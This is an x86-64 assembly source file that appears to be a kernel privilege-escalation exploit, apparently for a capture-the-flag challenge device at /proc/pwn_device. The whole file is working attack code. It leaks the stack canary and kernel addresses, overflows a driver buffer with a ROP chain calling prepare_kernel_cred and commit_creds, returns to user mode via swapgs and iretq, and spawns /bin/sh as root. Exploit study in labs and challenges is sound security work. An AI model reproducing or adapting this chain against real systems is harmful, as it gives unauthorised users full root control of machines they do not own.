bits 64

commit_creds_addr equ 0xffffffffb8c87e80
prepare_kernel_cred_addr equ 0xffffffffb8c881c0
sread_return_addr equ 0xffffffffb8e3e347

read_amount equ 0x140
read_canary_offset equ 0x80
read_retaddr_offset equ 0x90
read_magicaddr_offset equ 0x130

gadget_pop_rdi equ 0xac9
gadget_ret equ 0xaca
gadget_iretq equ 0x5e1f

gadget2_swapgs equ 0xe2e

write_canary_offset equ 0x80
write_retaddr_offset equ 0x90
write_amount equ (write_retaddr_offset + 0x60)

section .text

global _start
_start:
	; save segment registers and flags
	xor eax, eax
	mov ax, cs
	mov [save_cs], rax
	mov ax, ss
	mov [save_ss], rax
	mov [save_rsp], rsp
	pushf
	pop rax
	mov [save_rflags], rax

	; open device file
	mov eax, 2
	mov rdi, device_file
	mov esi, 2
	syscall
	test rax, rax
	js error
	mov [fd], rax

	; extend write limit (ioctl)
	mov eax, 16
	mov rdi, [fd]
	mov esi, 0x20
	mov edx, 0x77777777
	syscall

	; read data
	xor eax, eax
	mov rdi, [fd]
	mov rsi, read_buf
	mov edx, read_amount
	syscall

	; construct payload
	mov rax, [read_buf + read_canary_offset]
	mov [payload_buf + write_canary_offset], rax
	mov rdx, [read_buf + read_retaddr_offset]
	mov rcx, [read_buf + read_magicaddr_offset]
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + write_retaddr_offset], rax
	; 0
	mov qword [payload_buf + (write_retaddr_offset + 0x08)], 0
	; ret
	lea rax, [rdx + gadget_ret]
	mov [payload_buf + (write_retaddr_offset + 0x10)], rax
	; prepare_kernel_cred
	lea rax, [rdx + (prepare_kernel_cred_addr - sread_return_addr)]
	mov [payload_buf + (write_retaddr_offset + 0x18)], rax
	; swapgs
	lea rax, [rcx + gadget2_swapgs]
	mov [payload_buf + (write_retaddr_offset + 0x20)], rax
	; (placeholder for popfq)
	mov rax, [save_rflags]
	mov [payload_buf + (write_retaddr_offset + 0x28)], rax
	; iretq
	lea rax, [rdx + gadget_iretq]
	mov [payload_buf + (write_retaddr_offset + 0x30)], rax
	; (rip for return)
	mov qword [payload_buf + (write_retaddr_offset + 0x38)], called_from_module
	; (cs for return)
	mov rax, [save_cs]
	mov [payload_buf + (write_retaddr_offset + 0x40)], rax
	; (rflags for return)
	mov rax, [save_rflags]
	mov [payload_buf + (write_retaddr_offset + 0x48)], rax
	; (rsp for return)
	mov rax, [save_rsp]
	mov [payload_buf + (write_retaddr_offset + 0x50)], rax
	; (ss for return)
	mov rax, [save_ss]
	mov [payload_buf + (write_retaddr_offset + 0x58)], rax

	; write payload
	mov eax, 1
	mov rdi, [fd]
	mov rsi, payload_buf
	mov edx, write_amount
	syscall

	; this write should result in jumping to called_from_module
	; if not, fall through to error
error:
	mov eax, 1
	mov edi, 1
	mov rsi, error_text
	mov edx, error_text_end - error_text
	syscall
	mov eax, 60
	mov edi, 1
	syscall

called_from_module:
	; rax should contain the return value of prepare_kernel_cred(0) here
	; modify the payload for second call
	mov rdx, [read_buf + read_retaddr_offset]
	; the argument
	mov [payload_buf + (write_retaddr_offset + 0x08)], rax
	; the function to call
	lea rax, [rdx + (commit_creds_addr - sread_return_addr)]
	mov [payload_buf + (write_retaddr_offset + 0x18)], rax
	; where to return
	mov qword [payload_buf + (write_retaddr_offset + 0x38)], launch_shell

	; write payload
	mov eax, 1
	mov rdi, [fd]
	mov rsi, payload_buf
	mov edx, write_amount
	syscall

	; oops...
	jmp error

	; will be called from iret
launch_shell:
	mov eax, 59
	mov rdi, shell_file
	xor esi, esi
	xor edx, edx
	syscall

	; execve failed
	jmp error

section .data

device_file:
	db '/proc/pwn_device', 0

shell_file:
	db '/bin/sh', 0

error_text:
	db 'error', 0x0a
error_text_end:

section .bss

save_cs:
	resq 1
save_ss:
	resq 1
save_rsp:
	resq 1
save_rflags:
	resq 1

fd:
	resq 1

read_buf:
	resb read_amount

payload_buf:
	resb write_amount
